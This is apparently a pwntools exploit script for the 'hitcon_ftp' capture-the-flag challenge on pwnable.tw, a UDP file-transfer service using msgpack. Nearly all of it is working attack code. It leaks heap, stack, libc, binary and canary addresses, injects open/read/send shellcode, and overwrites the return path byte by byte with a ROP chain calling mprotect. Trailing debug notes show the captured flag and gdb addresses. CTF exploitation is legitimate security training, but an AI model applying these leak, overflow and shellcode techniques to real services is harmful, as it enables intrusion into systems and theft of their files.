#!/usr/bin/env python3

from pwn import *
import msgpack
import socket
import zlib
import struct

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)


context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('hitcon_ftp_patched', checksec=False)
libc = ELF('libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so', checksec=False)
context.binary = exe

p = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
p.bind(("0", 3636))



if args.REMOTE:
    if int(sys.argv[1]):
        port = int(sys.argv[1])
    else:
        s  = remote("chall.pwnable.tw", 10309)
        s.recvuntil(b'on udp port: ')
        port = int(s.recvline())


def s_pack(pack, p = p, condition = 1):
    if condition == 1:
        data = msgpack.packb(pack,use_bin_type= True )
    else:
        data = msgpack.packb(pack,use_bin_type= False )
         
    print(f'packet: {pack}')
    info(f'packet size: {size(data)}')
    print("[>] source:", p.getsockname())

    if args.REMOTE:
        p.sendto(data, ("chall.pwnable.tw", port))
        # p.sendto(data, ("0", 36))
    else:
        p.sendto(data, ("0", 69))


def r_pack(p):
    data, addr = p.recvfrom(0x10000)
    print("[<] from:", addr)
    print(f'Raw packet data received: {data}')
    try:
        print("[<] msgpack received:", msgpack.unpackb(data, raw=True, strict_map_key=False))
    except Exception as e:
        print("[!] msgpack unpack failed:", e)

    return data


def msgpack_print_str_like(buf) :
   
    out = bytearray()
    for c in (buf):
        # c is int: 0~255
        if c == 0x22:
            out+= b'\\"'
        # C isprint-like ASCII printable range
        elif 0x20 <= c <= 0x7e:
            out.append(c)
        else:
            out += f"\\x{c:02x}".encode()
    return bytes(out)

def calc_err(data, minus):
    # same as initial num = 0xffffffff and final ~num
    
    res = msgpack_print_str_like(data)
    
    # only works if last byte is printable character
    # sometimes still not work too
    """
    AI suchhhhhhhhhh!!! :((((
    If last byte is some raw byte, then need to len-1
    It happened like that because the oringinal command
    in C used snprintf to transfer bytes and used that return 
    nbytes to minus or add with the current len then 
    compare it with given one
    Quite confusing, just reverse in that step to understand mroe 
    """
    crc_input = res[:len(data) - minus]
    print(f'len: {len(crc_input)}')
    print(f'After convert: {crc_input}')
    return zlib.crc32(crc_input) & 0xffffffff



def path_1(name, p = p, load = None, load2 = None):
    pack = [
        1, name, "netascii"
    ]
    if load is not None:
        pack.append(load)
    if load2 is not None:
        pack.append(load2)

    s_pack(pack, p)
    res = r_pack(p)
    global cnt
    cnt = 1

    return res


def path_2(name, p = p, load = None, load2 = None):
    pack = [
        2, name, "netascii"
    ]
    if load is not None:
        pack.append(load)
    if load2 is not None:
        pack.append(load2)

    s_pack(pack, p)
    res = r_pack(p)
    return 0, res

def path(pack, p = p):
    s_pack(pack, p)
    res = r_pack(p)
    return 0, res

cnt = 1

def write_file(load, p = p, cnt = cnt, a = 1, minus=0):
    
    pack = [
        3, cnt, calc_err(load, minus), load
    ]

    s_pack(pack, p)
    if a:
        r_pack(p)
    
    return cnt + 1

def read_file(p = p, cnt = cnt):
    info(f'read file attempt: {cnt}')
    pack1 = [
    4, cnt-1, 
    ]


    s_pack(pack1, p)
    res = r_pack(p)

    return cnt + 1, res

def set_err(state, str, p = p):
    info(f'setting error:')
    pack = [
    5, state, str
    ]
    s_pack(pack, p)

load = {
    "blksize": 0x536
}

cnt = path_1("flag", p, load)

data = path_1("../".ljust(0x100, "a"))

leak = data.find(b"../".ljust(0x100, b"a"))

print(f'len data received: {len(data)}')

print(f'leak: {data[leak+0x100:leak+0x106]}')

heap_leak = u64( data[leak+0x100:leak+0x106] + b'\0\0')
heap_base = heap_leak - 0x22ad0

info(f'heap leak: {hex(heap_leak)}')
info(f'heap base: {hex(heap_base)}')

target_stack = heap_base+0x20200
target_binary = heap_base+0x22a80
target_libc = heap_base+0x22b38
def leak_data(target_1, target_2, len1 = 8, len2 = 8):
    load = [
        # "blksize": 0xf0b -0xd,
        "blksize", 0x200,
    ]

    cnt = path_2("aa",p, load, 0x36)

    # size of other components: 0xb

    payload = flat(
        0xbeef, 0,
        5, len1, target_1, # key 1
        2, 0x36, target_1, # value 1

        5, len2, target_2,
        2, 0x24, target_2,

    ).ljust(0x200, b's')

    # input("cechk")
    cnt = write_file(payload)

    load = [
        "blksize", 0x200,
    ]
    for i in range(0xb6):
        load.append(i)

    cnt, data = path_2("as", p ,load, 0x36)
    return cnt, data

cnt , data = leak_data(target_stack, target_libc)
print(f'len data received: {len(data)}')

print(f'leak: {data[15:21]}')

stack_leak = u64( data[15:21] + b'\0\0')
libc_leak = u64(data[23:23+6] + b'\0\0')
libc.address  = libc_leak-0x3ec680

target_canary = stack_leak+0x3f1

path_targer = stack_leak+0x750

cnt, data = leak_data(target_binary, target_canary)

binary_leak = u64(data[15:21] + b'\0\0')
exe.address = binary_leak-0x8e02
canary = u64(b'\0' + data[23:-1])

info(f'stack leak: {hex(stack_leak)}')
info(f'libc leak: {hex(libc_leak)}')
info(f'libc base: {hex(libc.address)}')
info(f'binary leak: {hex(binary_leak)}')
info(f'binary base: {hex(exe.address)}')
info(f'canary leak: {hex(canary)}')

# write_file(load, p = p, cnt = cnt, a = 1, minus=0)
# path_2(name, p = p, load = None, load2 = None)

win = heap_base+0x24290
fake_dest = heap_base + 0x253c8



load = {
    "blksize": 0x1000
}

def bof(payload):
    path_2("wdw", p, {"blksize": 0x1000})
    # add one more byte to make snprintf copy 1 more
    data = payload + b"e" 
    
    load = [3, 1, 0, data]
    s_pack(load, p, 0)

def bof_addr(addr, offs):
    offs-=1
    load = b'a'*offs + b'b'*7
    bof(load)

    load = b'a'*offs + p64(addr)[:-2]
    bof(load)

def bof_val(val, offs):
    load = b'a'*offs + val
    bof(load)
# input("bof")
if args.REMOTE:
    p2 = remote("chall.pwnable.tw", port, typ="udp")
else:
    p2 = remote("0", 69, typ="udp")

pack = [
    2, "ahdw", "netascii"
]

pack = msgpack.packb(pack, use_bin_type= False)
p2.send(pack)
path = "/home/hitcon_ftp/flag"

send_err = exe.sym.send_err 
send_data = exe.sym.send_data

target_pack = heap_base+0x252a0
err = heap_base+0x253e0
shellcode = asm(f"""
   {shellcraft.pushstr(path)}
    mov rdi, rsp
    xor esi, esi
    xor edx, edx
    mov eax, 2
    syscall

    mov rdi, rax
    mov rsi, {err}
    mov edx, 0x50
    mov eax, 0
    syscall

    mov rdi, {target_pack}
    mov rsi, {err}
    mov edx, 0x50
    mov rbp, {send_data}
    call rbp
""").ljust(0x200, b's')
# 0x5555558252d0
"""
    mov rdi, rax
    pop rsi
    mov edx, 0x50
    xor r10, r10
    lea r8, [rip+0x10d5]
    mov r9, 0x10
    mov eax, 0x2c
    syscall

"""
# 0x555555823a80
def calc_str(data):
    idx = data.find(b'\0')
    res = data[:idx] + p8(0x22)
    print(f'res: {res}')
    print(f'len res: {len(res)}')
    return zlib.crc32(res) & 0xffffffff

def write_file_str(load):
    pack = [
        3, 1, calc_str(load), load
    ]

    pack = msgpack.packb(pack, use_bin_type= False)
    p2.send(pack)

# input("asmsmsmwms")

write_file_str(shellcode)
# input("bof")

pop_rdi  =0x000000000002155f + libc.address
pop_rsi = 0x0000000000023e6a + libc.address
pop_rdx = 0x0000000000001b96 + libc.address

rop = [
    pop_rdi, heap_base+0x24036,
    pop_rsi, 0x1500,
    pop_rdx, 7,
    libc.sym.mprotect,
    win
]


bof_addr(win, 0x264)
# bof_addr(libc.address+0x11b7e0, 0x264-8)
bof_addr(libc.sym.mprotect, 0x264-8)

print(hex(libc.sym.mprotect))

for i in range(7, -1, -1):
    bof_val(b'b'*i, 0x253)
bof_val(p8(0x7), 0x253)
bof_addr(pop_rdx, 0x254-0x8)

for i in range(7, -1, -1):
    bof_val(b'b'*i, 0x253-0x10)
bof_val(p16(0x1580), 0x253-0x10)

bof_addr(pop_rsi, 0x254-0x18)
bof_addr(heap_base+0x24036, 0x254-0x20)

bof_val(b'c', 0x232)

bof_addr(pop_rdi, 0x254-0x28)



# 0x224
load = b'a'*0x20b + p64(canary+0x36)
bof(load)
load = b'a'*0x20b
bof(load)
# mprotect stack arena: size should be 0x1500
info(f'stack leak: {hex(stack_leak)}')
info(f'libc leak: {hex(libc_leak)}')
info(f'libc base: {hex(libc.address)}')
info(f'binary leak: {hex(binary_leak)}')
info(f'binary base: {hex(exe.address)}')
info(f'canary leak: {hex(canary)}')
info(f'heap leak: {hex(heap_leak)}')
info(f'heap base: {hex(heap_base)}')


# input("recv")
p2.interactive()
# if args.REMOTE:
    # s.close()
# r_pack(p2)
# rip 0x555555825302


# s.interactive()
"""

\x92\x04\x00$ 
[DEBUG] Sent 0x1 bytes:
    b'\n'
[DEBUG] Received 0x5a bytes:
    00000000  94 03 01 ce  98 96 5d 1d  c4 50 46 4c  41 47 7b 63  │····│··]·│·PFL│AG{c│
    00000010  34 70 74 75  72 33 5f 74  68 33 5f 66  30 72 74 75  │4ptu│r3_t│h3_f│0rtu│
    00000020  6e 33 5f 62  79 5f 68 31  74 63 30 6e  5f 66 74 70  │n3_b│y_h1│tc0n│_ftp│
    00000030  7d 0a 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │}···│····│····│····│
    00000040  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000050  00 00 00 00  00 00 00 00  00 00                     │····│····│··│
    0000005a
\x94\x03\x01Θ\x96]\x1d\xc4PFLAG{c4ptur3_th3_f0rtun3_by_h1tc0n_ftp}
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$  

bof stack: 0x7fffffffe0fc

fp1: 0x555555824d00

set max-visualize-chunk-size 0x500

packer: 0x7fffffffde40

0x555555823d00: newest buf

local stack packet: 0x7fffffffdfc0

heap: 0x555555821a78
check stack: 0x7fffffffdea0

packet on stack: 0x7fffffffdfd0

t_size: oack_opts+0x84

heap packet after set up: 0x555555824d10

0x55555560d060 (init_reqs)


make stack larger for bof:
PAD=$(python3 -c 'print("A"*0x10000)') sudo -E gdb ./hitcon_ftp_patched
"""

# p.interactive()
